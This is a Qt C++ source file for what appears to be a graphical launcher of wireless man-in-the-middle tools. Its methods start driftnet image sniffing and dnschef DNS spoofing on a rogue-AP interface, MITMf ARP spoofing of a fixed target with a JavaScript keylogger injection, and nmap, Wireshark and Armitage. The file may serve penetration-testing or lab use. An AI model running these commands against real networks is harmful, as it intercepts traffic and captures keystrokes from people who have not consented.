#include "softdeal.h"
#include<QFile>
#include<QTextStream>
#include <QIODevice>
#include<QProcess>
#include<QDebug>

SoftDeal::SoftDeal(QObject *parent): QObject(parent) {

}

SoftDeal::~SoftDeal() {

}

void SoftDeal::getinfo(QString info, int i) {
    QStringList qsl;
    qsl = info.split(";");
    qDebug()<<qsl;

    switch(i){
    case 0:
        imageSniffer(qsl);
        break;
    case 1:
        dns(qsl);
        break;
    case 2:
        break;
    case 3:
        break;
    case 4:
        wireshark(qsl);
        break;
    case 5:
        metasploit(qsl);
        break;
    }
}

void SoftDeal::imageSniffer(QStringList info){
    //执行命令  // execute 阻塞，startDetached 非阻塞
    // "gnome-terminal -x bash -c \"dnschef -i 10.0.0.1 --nameserver 210.73.64.1#53\"";
    //"gnome-terminal -x sh -c \"nmap;exec bash\"";
    QString command="gnome-terminal -x bash -c \"driftnet -i at0; exec bash\"";
    QProcess::startDetached(command);
}

void SoftDeal::dns(QStringList info){
    QString command="gnome-terminal -x bash -c \"dnschef -i 10.0.0.1 --nameserver 210.73.64.1#53;exec bash\"";
    QProcess::startDetached(command);
}

void SoftDeal::webFlow(QStringList info){
    QString command="bash -c \"nmap;exec bash\"";
    QProcess::startDetached(command);
}

void SoftDeal::js80(QStringList info){
    QString command="gnome-terminal -x bash -c \"./mitmf.py -i at0 --spoof --arp --gateway 10.0.0.1 --target 10.0.0.10 --jskeylogger;exec bash\"";
    QProcess::startDetached(command);
}

void SoftDeal::wireshark(QStringList info){
    QString command="bash -c \"wireshark;exec bash\"";
    QProcess::startDetached(command);
}

void SoftDeal::metasploit(QStringList info){
    QString command="bash -c \"armitage;exec bash\"";
    QProcess::startDetached(command);
}

